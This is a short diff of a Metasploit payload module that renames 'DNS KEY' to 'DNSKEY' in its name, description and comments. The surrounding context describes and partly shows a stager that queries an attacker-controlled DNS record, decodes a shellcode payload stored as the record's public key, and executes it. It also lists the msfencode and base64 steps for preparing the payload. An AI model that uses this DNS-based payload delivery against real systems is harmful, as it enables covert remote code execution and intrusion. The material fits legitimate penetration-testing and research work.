@@ -18,8 +18,8 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'DNS KEY Record Payload Execution',
-			'Description'   => 'Performs a KEY query for a given DNS record & executes the returning payload',
+			'Name'          => 'DNSKEY Record Payload Execution',
+			'Description'   => 'Performs a DNSKEY query for a given DNS record & executes the returning payload',
 			'Author'        =>
 				[
 					'corelanc0d3r <peter.ve[at]corelan.be>'
@@ -49,7 +49,7 @@ module Metasploit3
 	#    ./msfencode -b '\x00\x0a\x0d' -t raw > /tmp/msgbox.bin
 	# base64 < /tmp/msgbox.bin 
 	#  <put the output on one line>
-	# 3. Create a DNS (public) KEY record in a zone you control and paste the base64 encoded version of the payload as public key
+	# 3. Create a DNSKEY record in a zone you control and paste the base64 encoded version of the payload as public key
 	# 4. Generate this payload to perform the DNS query, retrieve the payload & execute it 
 
 	#
@@ -58,7 +58,7 @@ module Metasploit3
 	def generate
 
 		dnsname		= datastore['DNSRECORD']
-		wType		= 0x0019	#DNS_TYPE_KEY
+		wType		= 0x0019	#DNS_TYPE_KEY (DNSKEY)
 		wTypeOffset	= 0x1c
 		bufferreg 	= "edi"
 
